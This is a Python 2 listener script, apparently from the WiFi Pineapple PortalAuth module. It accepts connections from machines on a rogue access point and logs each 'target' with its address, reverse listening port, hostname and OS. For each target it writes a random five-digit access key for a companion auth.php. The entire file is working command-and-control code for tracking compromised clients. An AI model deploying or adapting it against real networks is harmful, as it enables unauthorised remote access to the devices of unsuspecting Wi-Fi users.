import socket
import os
import sys
import time
from random import randint

lhost = "172.16.42.1"
lport = 4443
targets = []
activitylog = "/pineapple/modules/PortalAuth/includes/pass/pass.log"
targetlog = "/pineapple/modules/PortalAuth/includes/pass/targets.log"
keyDir = "/pineapple/modules/PortalAuth/includes/pass/keys/"

class Target:
	def __init__(self,addr = None,port = None,name = None,osType = None):
		self.addr = addr
		self.port = port
		self.hostname = name
		self.platform = osType

	def targetInfo(self):
		info = "Address: " + self.addr + "\r\n"
		info += "Port: " + str(self.port) + "\r\n"
		info += "Hostname: " + self.hostname + "\r\n"
		info += "OS: " + self.platform + "\r\n\r\n"
		return info

def now():
	return time.strftime("%m/%d/%Y %H:%M:%S")

# Import the target information from the target log
with open (targetlog, 'r') as f:
	for line in f.readlines():
		parts = line.split(":")
		if parts[0] == "Address":
			t = Target()
			t.addr = parts[1].strip()
		elif parts[0] == "Port":
			t.port = int(parts[1].strip())
		elif parts[0] == "Hostname":
			t.hostname = parts[1].strip()
		elif parts[0] == "OS":
			t.platform = parts[1].strip()
			targets.append(t)
		else:
			pass

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((lhost,lport))
server.listen(5)

with open(activitylog, "a") as f:
	f.write("[!] " + now() + " - Server listening on " + lhost + " port " + str(lport) + "\r\n")

curTarget = accesskey = None
connected = False
while 1:
	if not connected:
		(client, address) = server.accept()
		connected = True
	while 1:
		try:
			recv_buffer = client.recv(4096)
			data = recv_buffer.split(";")
			
			# If the target already exists update the listening port
			if any(tgt.addr == address[0] for tgt in targets) is True:
				for _tgt in targets:
					if _tgt.addr == address[0]:
						_tgt.port = int(data[0])
						_tgt.hostname = data[1]
						_tgt.platform = data[2]
						curTarget = _tgt.addr.replace('.', '_')
						with open(activitylog, "a") as f:
							f.write("[!] " + now() + " - Target port updated for " + _tgt.addr + " to " + str(_tgt.port) + "\r\n")
			else:
				# Add a new target to the list
				t = Target(address[0], int(data[0]), data[1], data[2])
				targets.append(t)
				curTarget = t.addr.replace('.', '_')
				with open(activitylog, "a") as f:
					f.write("[+] " + now() + " - New target acquired at " + t.addr + " on port " + str(t.port) + "\r\n")
			
			# Write out all targets to the target log
			with open(targetlog, "w") as f:
				for t in targets:
					f.write(t.targetInfo())
			
			# Generate a random access key, store it in a file for later access by auth.php, and
			# send the key back to the client
			with open(keyDir + curTarget + ".txt", "w") as f:
				accesskey = '%05i' % randint(0,99999)
				f.write(accesskey)
				client.send(accesskey)
			
			if not len(recv_buffer):
				connected = False
				break
		except:
			connected = False
			break
server.close()